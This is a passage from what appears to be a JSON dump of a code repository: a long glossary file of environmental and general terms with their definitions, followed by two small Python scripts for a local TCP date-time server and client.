station which uses wind to drive a turbine which creates electricity.\"], \"woman\": [\"An adult human member of the sex that produces ova and bears young.\"], \"woman's status\": [\"The social position, rank or relative importance of women in society.\"], \"timber\": [\"A wood, especially when regarded as a construction material.\\\\n(Source: CED)\"], \"wood\": [\"An area where trees grow, where there are, no streets, no buildings, no agriculture beyond growing trees.\", \"A dense growth of trees more extensive than a grove and smaller than a forest.\", \"The substance making up the central part of the trunk and branches of a tree. Used as a material for construction, to manufacture various items, etc. or as fuel.\"], \"woodland clearance\": [\"The permanent clear-felling of an area of forest or woodland.\"], \"wood preservation\": [\"The use of chemicals to prevent or retard the decay of wood, especially by fungi or insects; widely used preservatives include creosote, pitch, sodium fluoride and tar; especially used on wood having contact with the ground.\"], \"wood waste\": [\"Waste which is left over after the processing of raw timber.\\\\n(Source: ISEP)\"], \"wool\": [\"The soft, curly hair that forms the fleece of sheep, lamas and other animals and which is used to produce clothing.\"], \"work accident\": [\"Accident occurring in the course of the employment and caused by inherent or related factors arising from the operation of materials of one's occupation.\"], \"working condition\": [\"All existing circumstances affecting labor in the workplace, including job hours, physical aspects, legal rights and responsibilities.\"], \"working hours\": [\"The time devoted to gainful employment or job-related activities, usually calculated as hours per day or per week.\"], \"workplace\": [\"Any or all locations or environments where people are employed.\"], \"world\": [\"The Earth with all its inhabitants and all things upon it.\", \"The third planet (counted from the center) of our solar system.\", \"Everything that exists anywhere.\", \"Social context of a person.\", \"Human collective existence.\", \"A planet,especially one which is inhabited or inhabitable.\", \"A great amount.\", \"A state or place of existence other than that on Earth.\", \"A state or place of existence other than that of contemporary life.\"], \"world heritage site\": [\"Site of great cultural significance and geographic areas of outstanding universal value, for example the Pyramids of Egypt, the historical centre of Rome, the Grand Canyon of United States, Venice, the Taj Mahal of India, the Great Wall of China.\\\\n(Source: GILP96)\"], \"write-off\": [\"Accounting procedure that is used when an asset is uncollectible and is therefore charged-off as a loss.\"], \"X ray\": [\"Short wavelength electromagnetic wave usually produced by bombarding a metal target in a vacuum.\"], \"yeast\": [\"Many species of unicellular fungi, most of which belong to the Ascomycetes and reproduce by budding. The genus Saccharomyces is used in brewing and winemaking because in low oxygen concentration it produces zymase, an enzyme system that breaks down sugars to alcohol and carbon dioxide. Saccharomyces is also used in bread-making. Some yeasts are used as a source of protein and of vitamins of the B group.\\\\n(Source: ALL)\"], \"infant\": [\"A young child in the first years of life.\\\\n(Source: ISEP)\"], \"youth\": [\"The state of being young.\"], \"youth work\": [\"Job opportunities and employment for adolescents, either for financial reward or educational enrichment.\\\\n(Source: RHW)\"], \"zinc\": [\"Chemical element with symbol Zn and atomic number 30; a brittle bluish-white metallic element that becomes coated with a corrosion-resistant layer in moist air and occurs chiefly in sphalerite and smithsonite.\", \"To cover with zinc.\"], \"zoning\": [\"Designation and reservation under a master plan of land use for light and heavy industry, dwellings, offices, and other buildings.\"], \"zoological garden\": [\"Area in which animals, especially wild animals, are kept so that people can go and look at them, or study them.\"], \"zoology\": [\"The study of animals, including their classification, structure, physiology, and history.\"], \"zoonosis\": [\"Infectious disease that is able to be transmitted from animals to humans or from humans to animals.\"], \"accounting\": [\"Method of recording all the transactions affecting the financial condition of a business or organization.\"], \"animal life\": [\"All of the animal life of any particular region or time.\"], \"consumer product\": [\"Economic good that directly satisfies human wants or desires.\\\\n(Source: WEBSTE)\"], \"human body\": [\"The entire physical structure of an human being.\"], \"human science\": [\"Group of sciences including sociology, anthropology, psychology, pedagogy, etc. as opposed to the humanistic group.\"], \"juridical act\": [\"An act relating to the administration of justice.\"], \"physical chemistry\": [\"A science dealing with the effects of physical phenomena on chemical properties.\\\\n(Source: LEE)\"], \"plant life\": [\"The plants that inhabit a certain region or environment.\"], \"risk management\": [\"The process of evaluating and selecting alternative regulatory and non-regulatory responses to prepare for the probability of an accidental occurrence and its expected magnitude of damage, including the consideration of legal, economic and behavioral factors.\\\\n(Source: HMD / TOE)\"], \"safety system\": [\"A unified, coordinated assemblage or plan of procedures and devices intended to lower the occurrence or risk of injury, loss and danger to persons, property or the environment.\\\\n(Source: OED / RHW)\"], \"social science\": [\"The study of society and of the relationship of individual members within society, including economics, history, political science, psychology, anthropology, and sociology.\"], \"promotion of trade and industry\": [\"Any activity that encourages or supports the buying, selling or exchanging of goods or services with other countries, which could include marketing, diplomatic pressure or the provision of export incentives such as credits and guarantees, government subsidies, training and consultation or advice.\"], \"masonry\": [\"A construction of stone or similar materials such as concrete or brick.\", \"Worldwide widespread movement for humanitarianism which gives its supporters an understanding of the ideal of the noble humanity.\", \"A widespread secret fraternal order whose members pledge mutually assistance and brotherly love.\"], \"sand flat\": [\"A flat, marshy or barren tract of land that is alternately covered and uncovered by the tide, and consisting of unconsolidated sediment (mostly mud and sand).\"], \"animal species\": [\"Species belonging to the animal kingdom.\"], \"plant species\": [\"Species belonging to the plant kingdom.\"], \"occupation\": [\"Productive activity, service, trade, or craft for which one is regularly paid.\", \"Task with which one occupies oneself.\", \"A situation where a country or region is under the control of a foreign army.\"], \"folk tradition\": [\"The common beliefs, practices, customs and other cultural elements of an ethnic or social group that are rooted in the past, but are persisting into the present due to means such as arts and crafts, songs and music, dance, foods, drama, storytelling and certain forms of oral communication.\\\\n(Source: VFP)\"], \"law branch\": [\"A subdivision of the body of principles and regulations established by a government or other authority, generally defined by its scope or application.\\\\n(Source: BLD / ISEP)\"], \"judicial system\": [\"Entire network of courts in a particular jurisdiction.\"], \"measuring instrument\": [\"Instrument that shows the extent or amount or quantity or degree of something.\"], \"major risk\": [\"The high probability that a given hazard or situation will yield a significant amount of lives lost, persons injured, damage to property , disruption of economic activity or harm to the environment; or any product of the probability of occurrence and the expected magnitude of damage beyond a maximum acceptable level.\\\\n(Source: TOE / HMD)\"], \"rescue system\": [\"Any series of procedures and devices used by trained personnel to provide immediate assistance to persons who are in danger or injured.\\\\n(Source: GT2 / HMD)\"], \"tax system\": [\"A co-ordinated body of methods or plan of procedures for levying compulsory charges for the purpose of raising revenue.\"], \"forest ecology\": [\"The science that deals with the relationship of forest trees to their environment, to one another, and to other plants and to animals in the forest.\"], \"urban ecology\": [\"Concept derived from biology in which the city is viewed as a total environment, as a life-supporting system for the large number of people concentrated there, and within this people organize themselves and adapt to a constantly changing environment. Regarded as the same as human ecology.\\\\n(Source: GOOD)\"], \"ecozone\": [\"A broad geographic area in which there are distinctive climate patterns, ocean conditions, types of landscapes and species of plants and animals.\"], \"environmental engineering\": [\"Branch of engineering concerned with the environment and its proper management. The major environmental engineering disciplines regard water supply, wastewater, stormwater, solid waste, hazardous waste, noise radiology, industrial hygiene, oceanography and the like.\\\\n(Source: PORT)\"], \"altitude\": [\"In general, a term used to describe a topographic eminence.\\\\n(Source: WHIT)\", \"A specific altitude or height above a given level.\", \"The angle between the horizontal and a point at a higher level (in surveying).\"], \"cove\": [\"A deep recess hollow, or nook in a cliff or steep mountainside, or a small, straight valley extending into a mountain or down a mountainside.\\\\n(Source: BJGEO /  WHIT)\", \"A valley or portion of lowland that penetrates into a plateau or mountain front.\\\\n(Source: BJGEO /  WHIT)\"], \"canyon\": [\"A long deep, relatively narrow steep-sided valley confined between lofty and precipitous walls in a plateau or mountainous area, often with a stream at the bottom; similar to, but largest than, a gorge. It is characteristic of an arid or semiarid area (such as western U.S.) where stream downcutting greatly exceeds weathering.\\\\n(Source: BJGEO)\", \"A valley, especially a long, narrow, steep valley, cut in rock by a river.\"], \"geographic circque\": [\"A deep steep-walled half-bowl-like recess or hollow, variously described as horseshoe- or crescent-shaped or semi-circular in plan, situated high on the side of a mountain and commonly at the head of a glacial valley and produced by the erosive activity of a mountain glacier. It often contains a small round lake, and it may or may not be occupied by ice or snow.\\\\n(Source: BJGEO)\"], \"continent\": [\"A protuberance of the Earth's crustal shell, with an area of several million square miles and sufficient elevation so that much of it above sea level.\"], \"creek\": [\"A narrow inlet or bay, especially of the sea.\\\\n(Source: CED)\"], \"fault\": [\"A fracture or a zone of fractures along which there has been displacement of the sides relative to one another parallel to the fracture.\", \"A wrong action attributable to bad judgment or ignorance or inattention.\", \"An imperfection in a device or machine.\", \"Wrong act done deliberately or good act omitted deliberately.\", \"An incorrect action not made deliberately.\"], \"cliff\": [\"A steep coastal declivity which may or may not be precipitous, the slope angle being dependent partly on the jointing, bedding and hardness of the materials from which the cliff has been formed, and partly on the erosional processes at work. Where wave attack is dominant the cliff-foot will be rapidly eroded and cliff retreat will take place, especially in unconsolidated materials such as clays, sands, etc., frequently leaving behind an abrasion platform at the foot of the cliff.\\\\n(Source: WHIT)\"], \"open sea\": [\"The high seas lying outside the exclusive economic zones of states. All states have equal rights to navigate, to overfly, to lay submarine cables, to construct artificial islands, to fish, and to conduct scientific research within the high seas.\\\\n(Source: GOOD)\"], \"coral reef lagoon\": [\"A coastal stretch of shallow saltwater virtually cut off from the open sea by a coral reef.\\\\n(Source: WHIT)\"], \"river bed\": [\"The channel containing or formerly containing the water of a river.\"], \"barrier reef\": [\"An elongated accumulation of coral lying at low-tide level parallel to the coast but separated from it by a wide and deep lagoon or strait.\"], \"marine park\": [\"A permanent reservation on the seabed for the conservation of species.\"], \"reserve\": [\"Any area of land or water that has been set aside for a special purpose, often to prevent or reduce harm to its wildlife and ecosystems.\\\\n(Source: RHW / DOE)\", \"To arrange for (something for someone else) in advance.\", \"To give or assign a resource to a particular person or cause.\", \"To assign a resource to a particular person or cause.\"], \"alignment\": [\"The selection and detailed layout of public transport routes in the light of construction, operation, service, technology, and economic criteria.\", \"The spatial property possessed by an arrangement or position of things in a straight line or in parallel lines.\"], \"bocage\": [\"The wooded countryside characteristic of northern France, with small irregular-shaped fields and many hedges and copses. In the French language the word bocage refers both to the hedge itself and to a landscape consisting of hedges. Bocage landscapes usually have a slightly rolling landform, and are found mainly in maritime climates. Being a small-scale, enclosed landscape, the bocage offers much variations in biotopes, with habitats for birds, small mammals, amphibians, reptiles and butterflies.\"], \"French formal garden\": [\"A style of garden displaying symmetry and geometrical patterns.\"], \"English garden\": [\"A plot of ground consisting of an orderly and balanced arrangement of masses of flowers, shrubs and trees, following British traditions or style.\\\\n(Source: CBO)\"], \"site protection\": [\"Precautionary actions, procedures or installations undertaken to prevent or reduce harm to the environmental integrity of a physical area or location.\"], \"coast protection\": [\"A form of environmental management designed to allay the progressive degradation of the land by coastal erosion processes.\"], \"environmental citizenship\": [\"The state, character or behavior of a person viewed as a member of the ecosystem with attendant rights and responsibilities, especially the responsibility to maintain ecological integrity and the right to exist in a healthy environment.\\\\n(Source: TOE / RHW)\"], \"sponsorship\": [\"A person, firm, organization, etc. that provides or pledges money for an undertaking or event.\"], \"migratory fish\": [\"Fishes that migrate in a body, often between breeding places and winter feeding grounds.\\\\n(Source: RRDA)\"], \"marine mammal\": [\"A diverse group of roughly 120 species of mammal that are primarily ocean-dwelling or depend on the ocean for food.\", \"Mammal which is adapted to live in the sea, such as whales, dolphins, porpoises, etc.\"], \"ovine\": [\"Horned ruminant mammals raised in many breeds for wool, edible flesh, or skin.\"], \"shelter\": [\"Cover or protection, as from weather or danger; place of refuge.\\\\n(Source: CED)\", \"A refuge, haven or other cover or protection from something.\", \"To take cover.\", \"To provide cover.\", \"A shielding or protection against the unpleasant, unwanted, or dangerous.\"], \"nesting area\": [\"A place where birds gather to lay eggs.\"], \"spawning ground\": [\"Area of water where fish come each year to produce their eggs.\"], \"nesting\": [\"The building of nests for egg laying and rearing of offspring.\"], \"animal population\": [\"A group of animals inhabiting a given area.\\\\n(Source: CED)\"], \"animal reproduction\": [\"Any of various processes, either sexual or asexual, by which an animal produces one or more individuals similar to itself.\"], \"survival\": [\"The act or fact of surviving or condition of having survived.\"], \"endemic species\": [\"Species native to, and restricted to, a particular geographical region.\"], \"broad-leaved tree\": [\"Deciduous tree which has wide leaves, as opposed to the needles on conifers.\\\\n(Source: PHC)\"], \"sea grass bed\": [\"Seaweeds communities formed by green, brown and red macroscopic algae and by sea phanerogams such as Posidonia oceanica and Zostera noltii, etc.\"], \"macrophyte\": [\"A large macroscopic plant, used especially of aquatic forms such as kelp (variety of large brown seaweed which is a source of iodine and potash).\\\\n(Source: LBC /  PHC)\"], \"riverside vegetation\": [\"Plants growing in areas adjacent to rivers and streams.\"], \"chestnut\": [\"Any north temperate fagaceous tree of the genus Castanea, such as Castanea sativa, which produce flowers in long catkins and nuts in a prickly bur.\", \"The nut of the chestnut tree.\"], \"vegetation level\": [\"A subdivision of vegetation characteristic of a certain altitude above sea level at a given latitude.\\\\n(Source: ECHO2)\"], \"plant population\": [\"The number of plants in an area.\"], \"arboretum\": [\"Collection of trees from different parts of the world, grown for scientific study.\"], \"chorology\": [\"The study of the causal relations between geographical phenomena occurring within a particular region.\"], \"botanical conservatory\": [\"Gardens for the conservation of rare species of plants.\\\\n(Source: RAMADE)\"], \"plant heritage\": [\"The sum of the earth's or a particular region's herb, vegetable, shrub and tree life viewed as the inheritance of the present generation, especially plant species deemed worthy of preservation and protection from extinction.\\\\n(Source: PPP / OED)\"], \"pruning\": [\"The cutting off or removal of dead or living parts or branches of a plant to improve shape or growth.\"], \"mountain forest\": [\"An extensive area of woodland that is found at natural elevations usually higher than 2000 feet.\"], \"state forest\": [\"Forest owned and managed by the State.\"], \"Mediterranean forest\": [\"Type of forest found in the Mediterranean area comprising mainly xerophilous evergreen trees.\"], \"private forest\": [\"A privately owned forest.\"], \"maquis\": [\"A low evergreen shrub formation, usually found on siliceous soils in the Mediterranean lands where winter rainfall and summer drought are the characteristic climate features.\"], \"nursery garden\": [\"A place where plants are propagated and nurtured until they reach a size appropriate for replanting at another location.\"], \"forest protection\": [\"Branch of forestry concerned with the prevention and control of damage to forests arising from the action of people or livestock, of pests and abiotic agents.\"], \"resinous plant\": [\"A plant yielding or producing resin.\"], \"big game\": [\"Large wild animals that weigh typically more than 30 lb when fully grown, hunted for food, sport or profit.\"], \"shellfish farming\": [\"Raising of shellfish in inland waters, estuaries or coastal waters, for commercial purposes.\"], \"oyster farming\": [\"Raising oysters for human consumption.\"], \"competitive examination\": [\"A test given to a candidate for a certificate or a position and concerned typically with problems to be solved, skills to be demonstrated, or tasks to be performed.\"], \"initial training\": [\"Any education, instruction or discipline occurring at the beginning of an activity, task, occupation or life span.\"], \"pedagogy\": [\"The principles, practice, or profession of teaching.\\\\n(Source: CED)\", \"Science on education and teaching.\"], \"cycle path\": [\"Part of the road or a special path for the use of people riding bicycles.\"], \"ski run\": [\"A trail, slope, or course for skiing.\"], \"ecomuseum\": [\"A private, non-profit facility where plants and animals can be viewed in a natural outdoor setting.\\\\n(Source: AGRENV)\"], \"folklore\": [\"The traditional and common beliefs, practices and customs of a people, which are passed on as a shared way of life, often through oral traditions such as folktales, legends, anecdotes, proverbs, jokes and other forms of communication.\\\\n(Source: VFP)\"], \"country lodge\": [\"A small house or a hut located in the countryside.\"], \"lodging\": [\"Provision of accommodation for rest or for residence in a room or rooms or in a dwelling place.\"], \"public\": [\"The community or people in general or a part or section of the community grouped because of a common interest or activity.\\\\n(Source: CED)\"], \"path\": [\"A route or track between one place to another.\", \"The direction of movement, line or route of a vessel at any given moment.\"], \"educational path\": [\"A guided trail, designed to explain to children a piece of countryside, the type of soil, flora, fauna, etc. Such trails may be self-guiding, using either explanatory notices set up at intervals or numbered boards referring to a printed leaflet: in other cases parties may be led by a demonstrator or warden.\\\\n(Source: GOOD)\"], \"seaside resort\": [\"A place near the sea where people spend their holidays and enjoy themselves.\"], \"winter sports resort\": [\"Resort where sports held in the open air on snow or ice, especially skiing are practiced.\"], \"all-terrain vehicle\": [\"A land carriage so constructed that it can be used on any kind of road or rough terrain and can be operated for many purposes, such as carrying goods, transporting the injured, conveying passengers, etc.\"], \"population density\": [\"The number of people relative to the space occupied by them.\"], \"young\": [\"Living being as genetically proceeding from an other one.\", \"The offspring or descendants of an animal (in some languages, it is used to refer to humans).\", \"In the early part of growth or life.\"], \"active population\": [\"The number of people available and eligible for employment within a given enterprise, region or nation.\"], \"time allocation\": [\"The act of assigning various hours of one's day, week or year to particular activities, especially those falling within the categories of work and leisure.\"], \"goods\": [\"A term of variable content and meaning. It may include every species of personal chattels or property. Items of merchandise, supplies, raw materials, or finished goods. Land is excluded.\"], \"goods and services\": [\"The total of economic assets, including both physical or storable objects and intangible acts of human assistance.\"], \"time budget\": [\"Determining or planning for allotment of time in hours, days, weeks, etc.\\\\n(Source: RHW)\"], \"living environment\": [\"External conditions or surroundings in which people live or work.\"], \"product life cycle\": [\"A product life cycle includes the following phases: acquisition of raw materials, production, packaging, distribution, use, recyling, and disposal.\"], \"quality certification\": [\"The formal assertion in writing that a commodity, service or other product has attained a recognized and relatively high grade or level of excellence.\\\\n(Source: BLD / RHW)\"], \"living standard\": [\"A measurement of the development level in a country or community, gauged by factors such as personal income, education, life expectancy, food consumption, health care, technology and the use of natural resources.\\\\n(Source: TEX)\"], \"supply and demand\": [\"The relationship between the amount or quantity of a commodity that is available for purchase and the desire or ability of consumers to buy or purchase the commodity, which, in theory, determines the commodity's price in a free market.\\\\n(Source: MGHME)\"], \"ecological inequality\": [\"Any imbalance or disparity among inhabitants of the same living environment deemed inappropriate, unjust or detrimental to that environment's integrity.\\\\n(Source: TOE / RHW)\"], \"social inequality\": [\"Unequal rewards or opportunities for different individuals within a group or groups within a society. If equality is judged in terms of legal equality, equality of opportunity, or equality of outcome, then inequality is a constant feature of the human condition.\"], \"myth\": [\"A traditional or legendary story, usually dealing with supernatural beings, ancestors, heroes or events, that is with or without determinable basis of fact or a natural explanation, but is used to explain some practice, rite or phenomenon of nature, or to justify the existence of a social institution.\"], \"social psychology\": [\"Study of the effects of social structure on cognition and behavior, of processes of face-to-face interaction, and of the negotiation of social order.\"], \"feeling for nature\": [\"A consciousness, sensibility or sympathetic perception of the physical world and its scenery in their uncultivated state.\"], \"socioeconomics\": [\"The study of the interaction between society and economy.\"], \"administrative deed\": [\"Any formal and legitimate step taken or decision made on matters of policy by a chief or other top-level officer within an organization.\\\\n(Source: DAM)\"], \"territorial government\": [\"An administrative body or system in which political direction or control is exercised over a designated area or an administrative division of a city, county or larger geographical area.\\\\n(Source: RHW / BLD)\"], \"citizen\": [\"A native or naturalized member of a state or nation who owes allegiance, bears responsibilities and obtains rights, including protection, from the government.\"], \"parliamentary debate\": [\"Formal discussion or dispute on a particular matter among the members of the parliament.\"], \"subsidiary principle\": [\"The fundamental doctrine or tenet that policy making decisions should be made at the most decentralized level, in which a centralized governing body would not take action unless it it is more effective than action taken at a lower government level.\"], \"national accounting\": [\"Organised method of recording all business transactions in the national economy.\"], \"satellite account\": [\"A separate financial record or statement that discloses financial activity in a particular area and supplements existing financial records.\\\\n(Source: RHW)\"], \"household expenditure\": [\"Any spending done by a person living alone or by a group of people living together in shared accommodation and with common domestic expenses.\\\\n(Source: ODE)\"], \"intervention fund\": [\"Money or financial resources set aside to interpose or interfere in any business affair in order to affect an outcome.\\\\n(Source: OED)\"], \"financial fund\": [\"Monetary resources set aside for some purpose.\"], \"International Monetary Fund\": [\"An international organization established in 1944, affiliated with the United Nations that acts as an international bank facilitating the exchange of national currencies and providing loans to member nations.\"], \"gross domestic product\": [\"The total output of goods and services produced by a national economy in a given period, usually a year, valued at market prices. It is gross, since no allowance is made, for the value of replacement capital goods.\", \"A measure of the economic production of a particular territory in financial capital terms over a specific time period.\"], \"process analysis\": [\"The examination of a process to understand it and therefore develop ideas for its improvement.\"], \"audit\": [\"The periodic or continuous verification of the accounts, assets and liabilities of a company or other organization, often to confirm compliance with legal and professional standards.\", \"To conduct an independent review and examination of system records and activities in order to test the adequacy and effectiveness of data security and data integrity procedures, to ensure compliance with established policy and operational procedures, and to recommend any necessary changes.\"], \"water cost\": [\"The value or the amount of money exchanged for the production and sustained supply of water.\\\\n(Source: EFP / RHW)\"], \"ecomarketing\": [\"The marketing of products that are presumed to be environmentally safe.\"], \"market study\": [\"The gathering and studying of data to determine the projection of demand for an item or service.\"], \"free trade\": [\"Trade which is unimpeded by tariffs, import and export quotas and other measures which obstruct the free movement of goods and services between states.\"], \"calculation\": [\"The act, process or result of calculating.\\\\n(Source: CED)\"], \"density\": [\"The mass of a substance per unit volume.\"], \"index\": [\"A list of record surrogates arranged in order of some attribute expressible in machine-orderable form.\\\\n(Source: MGH)\"], \"census survey\": [\"An official periodic count of a population including such information as sex, age, occupation, etc.\"], \"statistical series\": [\"An ordered sequence of data samples in numerical form used to predict or demonstrate trends through time and space.\"], \"opinion survey\": [\"The canvassing of a representative sample of a large group of people on some question in order to determine the general opinion of a group.\"], \"rate\": [\"The amount of change in some quantity during a time interval divided by the length of the time interval.\"], \"seasonal variation\": [\"In time series, that part of the movement which is assigned to the effect of the seasons on the year.\"], \"scientific committee\": [\"An organized group of persons elected or appointed to discuss scientific matters.\"], \"applied research\": [\"Research directed toward using knowledge gained by basic research to make things or to create situations that will serve a practical or utilitarian purpose.\\\\n(Source: MGH)\"], \"scientific research\": [\"Systematic investigation to establish facts or principles concerning a specific scientific subject.\"], \"agronomy\": [\"The principles and procedures of soil management and of field crop and special-purpose plant improvement, management, and production.\"], \"agrosystem\": [\"Ecosystem dominated by the continuous agricultural intervention of man.\"], \"crop treatment\": [\"Use of chemicals in order to avoid damage of crops by insects or weeds.\\\\n(Source: WRIGHTa)\"], \"aviculture\": [\"The raising, keeping, and care of birds.\"], \"transhumance\": [\"The seasonal migration of livestock to suitable grazing grounds.\"], \"mineral conditioner\": [\"Any naturally occurring inorganic substances with a definite chemical composition and usually of crystalline structure, such as rocks, which are used to stabilize soil, improving its resistance to erosion, texture and permeability.\\\\n(Source: RHW / SOI)\"], \"slash and burn culture\": [\"A traditional farming system that has been used by generations of farmers in tropical forests and the savannah of north and east Africa. It is known to be an ecologically sound form of cultivation, and because the soil is poor in tropical rain forests it is a sustainable method of farming. It is still practised today, primarily in the developing countries. Small areas of bush or forests are cleared and the smaller trees burned. This unlocks the nutrients in the vegetation and gives the soil fertilizer that is easily taken up by plants. A few years later the soil is degraded and the farmer moves on to do the same at another site. The original ground is left fallow for anything up to 20 years so that the forest can regenerate. With the growth in population and in the subsequent need for more farming land to produce food, the method is increasingly being used today to clear large areas of tropical forests for cattle ranching, and in most cases the ground is not left fallow for long enough and, with modern mechanized farming systems, not enough tree stumps or suitable habitats for plant life are left to start the regeneration process.\\\\n(Source: WRIGHT)\"], \"chalk\": [\"A soft, pure, earthy, fine-textured, usually white to light gray or buff limestone of marine origin, consisting almost wholly (90-99%) of calcite.\", \"A writing implement (made of white or coloured chalk) that leaves an impression through being divided into a powder or paste that sticks to the surface.\"], \"organic matter\": [\"Plant and animal residue that decomposes and becomes a part of the soil.\"], \"drainage system\": [\"A surface stream, or a body of impounded surface water, together with all other such streams and water bodies that are tributary to it and by which a region is drained. An artificial drainage system includes also surface and subsurface conduits.\"], \"irrigation system\": [\"A system of man-made channels for supplying water to land to allow plants to grow.\"], \"soil salinity\": [\"Measurement of the quantity of mineral salts found in a soil. Many semi-arid and arid areas are naturally salty. By definition they are areas of substantial water deficit where evapotranspiration exceeds precipitation. Thus, whereas in humid areas there is sufficient water to percolate through the soil and to leach soluble materials from the soil and the rocks into the rivers and hence into the sea, in deserts this is not the case. Salts therefore tend to accumulate.\\\\n(Source: PHC /  GOUD)\"], \"approach\": [\"The way or means of entry or access.\", \"The method, orientation, way of thought in which one takes up a subject, a problem, an argument etc.\", \"The act of drawing spatially closer to something.\", \"To begin to deal with, e.g., a task, a problem, etc.\", \"To come near to; to move towards.\", \"To come near or verge on, resemble, come nearer in quality, or character.\", \"To make advances to someone, usually with a proposal or suggestion.\", \"To come near in time.\"], \"railway station\": [\"A place along a route or line at which a train stops to pick up or let off passengers or goods, especially with ancillary buildings and services.\", \"A building in or at which trains stop.\"], \"bus station\": [\"A place along a route or line at which a bus stops for fuel or to pick up or let off passengers or goods, especially with ancillary buildings and services.\\\\n(Source: CED)\"], \"railway network\": [\"The whole system of railway distribution in a country.\"], \"road network\": [\"The system of roads through a country.\"], \"navigation\": [\"The science or art of conducting ships or aircraft from one place to another, esp. the method of determining position, course, and distance travelled over the surface of the earth by the principles of geometry and astronomy and by reference to devices (as radar beacons or instruments) designed as aids.\", \"The transport and movement of goods, people and animals over water.\"], \"merchant shipping\": [\"Transportation of persons and goods by means of ships travelling along fixed navigation routes.\\\\n(Source: ZINZANa)\"], \"combined transport\": [\"Transport in which more than one carrier is used, e.g. road, rail and sea.\"], \"periurban space\": [\"Any expanse of land or region located on the outskirts of a city or town.\\\\n(Source: RHW)\"], \"single family dwelling\": [\"An unattached dwelling unit inhabited by an adult person plus one or more related persons.\"], \"traditional architecture\": [\"Methods of construction which use locally available resources to address local needs.\"], \"building destruction\": [\"The tearing down of buildings by mechanical means.\"], \"building restoration\": [\"The accurate reestablishment of the form and details of a building, its artifacts, and the site on which it is located, usually as it appeared at a particular time.\"], \"ISO standard\": [\"Documented agreements containing technical specifications or other precise criteria to be used consistently as rules, guidelines, or definitions of characteristics, to ensure that materials, products, processes and services are fit for their purpose.\\\\n(Source: ISOCH)\"], \"technical regulation\": [\"A government or management prescribed rule that provides detailed or stringent requirements, either directly or by referring to or incorporating the content of a standard, technical specification or code of practice.\\\\n(Source: PVG)\"], \"codification\": [\"The process of collecting and arranging systematically, usually by subject, the laws of a state or country, or the rules and regulations covering a particular area or subject of law or practice.\"], \"animal rights\": [\"Just claims, legal guarantees or moral principles accorded to sentient, non-human species, including freedom from abuse, consumption, experimentation, use as clothing or performing for human entertainment.\"], \"citizen rights\": [\"Rights recognized and protected by law, pertaining to the members of a state.\\\\n(Source: ZINZANa)\"], \"notice\": [\"Factual information, advice or a written warning communicated to a person by an authorized source, often conveyed because of a legal or administrative rule requiring transmission of such information to all concerned parties.\", \"To pay attention and perceive something.\", \"A sign posted in a public place as an advertisement.\", \"To see, discover or determine something, unclear, distant or hidden, by looking carefully.\", \"Advance notification (usually written) of the intention to withdraw from an arrangement of contract.\", \"To make or write a comment on.\"], \"order\": [\"A direction or command of a court. In this sense it is often used synonymously with judgment.\", \"The document bearing the seal of the court recording its judgment in a case.\", \"To express as instruction to be executed by the receiver, in accordance with an authority acknowledged by him.\", \"A biological taxon, a group of species, part of a class and consisting of one or more families\", \"A formal association of people with similar interests.\", \"That which is enjoined or ordered to one or several persons by a superior authority.\", \"A condition of regular or proper arrangement.\", \"A command given by a superior (e.g., a military or law enforcement officer) that must be obeyed.\", \"A group of person living under a religious rule.\", \"A degree in a continuum of size or quantity.\", \"To place a request for goods at a company.\", \"To give instructions to or direct somebody to do something with authority.\"], \"building permit\": [\"Authorization required by local governmental bodies for the erection of an enclosed structure or for the major alteration or expansion of an existing edifice.\"], \"law draft\": [\"The form in which proposed statutes, resolutions or special acts are introduced into a legislative body, before they are enacted or passed.\"], \"regulation\": [\"A specification of behavior used as an authoritative guide for conduct.\", \"The act of regulating; a rule or order prescribed for management or government; a regulating principle; a precept. Rule of order prescribed by superior or competent authority relating to action on those under its control.\"], \"concession\": [\"Any rebate, abatement, voluntary grant of or a yielding to a demand or claim, typically made by a government or controlling authority to an individual or organization.\\\\n(Source: BLD)\"], \"declaration of public utility\": [\"Administrative Act giving the right to take private property for public use.\\\\n(Source: BLACKa)\"], \"public inquiry\": [\"An investigation, especially a formal one conducted into a matter of public utility by a body constituted for that purpose by a government, local authority, or other organization.\"], \"easement\": [\"The rights of use over the property of someone else; a burden on a piece of land causing the owner to suffer access by another.\"], \"crime\": [\"Any act done in violation of those duties which an individual owes to the community, and for the breach of which the law has provided that the offender shall make satisfaction to the public.\\\\n(Source: BLACK)\"], \"criminal law procedure\": [\"The rules of law governing the procedure by which crimes are investigated, prosecuted, adjudicated, and punished.\\\\n(Source: BLACK)\"], \"conflict\": [\"A state of opposition or disagreement between ideas, interests, etc.\"], \"litigation\": [\"A judicial contest, a judicial controversy, a suit at law.\\\\n(Source: BLACK)\"], \"justice\": [\"The correct application of law as opposed to arbitrariness.\"], \"trial\": [\"A judicial examination and determination of issues between parties to action; whether they need issues of law or of fact. A judicial examination, in accordance with law of the land, of a cause, either civil or c"
        },
        {
          "name": "date-timeclient.py",
          "type": "blob",
          "size": 0.2197265625,
          "content": "import socket\r\n\r\nsoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\nsoc.connect((socket.gethostname(), 2905))\r\nrecmsg = soc.recv(1024)\r\nsoc.close()\r\nprint(\"The time got from the server is %s\" % recmsg.decode(\"ascii\"))\r\n"
        },
        {
          "name": "date-timeserver.py",
          "type": "blob",
          "size": 0.37890625,
          "content": "import socket\r\nimport time\r\n\r\nsoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\nsoc.bind((socket.gethostname(), 2905))\r\nsoc.listen(5)\r\nwhile True:\r\n\r\n    clientsocket, addr = soc.accept()\r\n\r\n    print(\"estavlishes  a connection from %s\" % str(addr))\r\n    currentTime = time.ctime(time.time()) + \"\\r\\n\"\r\n    clientsocket.send(currentTime.encode(\"ascii\"))\r\n    clientsocket.close()\r\n"
        },
        {
          "name": "days_from_date.py",
          "type": "blob",
          "size": 1.865234375,
